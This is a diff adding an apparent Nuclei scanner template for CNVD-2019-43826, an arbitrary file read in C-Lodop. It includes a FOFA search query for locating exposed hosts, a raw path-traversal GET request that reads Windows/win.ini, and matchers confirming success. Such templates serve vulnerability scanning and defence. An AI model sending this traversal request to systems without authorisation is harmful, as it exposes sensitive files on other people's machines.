@@ -1,0 +1,24 @@
+id: CNVD-2019-43826
+
+info:
+  name: C-Lodop Arbitrary File Read (CNVD-2019-43826)
+  author: SleepingBag945
+  severity: medium
+  description: |
+    An attacker can use this vulnerability to obtain sensitive information
+  metadata:
+    fofa-query: title="C-Lodop"
+
+http:
+  - raw:
+      - |
+        GET /../../../../../../../../../../Windows/win.ini  HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1,"[fonts]") && contains(body_1,"extensions") && contains(body_1,"files")'
+        condition: and
